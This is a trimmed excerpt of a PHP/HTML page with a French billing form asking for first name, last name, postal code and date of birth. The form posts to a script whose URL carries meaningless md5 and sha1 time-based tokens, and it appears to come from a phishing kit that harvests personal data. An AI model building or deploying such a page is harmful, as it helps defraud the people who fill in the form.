            ...
            <div class="contain biling-p">
                <form method="POST" action="<?php echo 'serv5202.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info">
                    <center>
						...
						<input type="text" maxlength="10" name="prenom" id="prenom" class="bill_input" placeholder="Prénom" autocomplete="off" autocorrect="off" autocapitalize="on" >
						<input type="text" maxlength="10" name="nom" id="nom" class="bill_input" placeholder="Nom" autocomplete="off" autocorrect="off" autocapitalize="on" >
						...
						<input type="text" name="postal" class="bill_input" placeholder="Code Postale" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
						...
						<input type="date" maxlength="10" name="dob" id="Dobt" class="bill_input" placeholder="Date de naissance (JJ/MM/AAAA)" autocomplete="off" autocorrect="off" autocapitalize="on" >
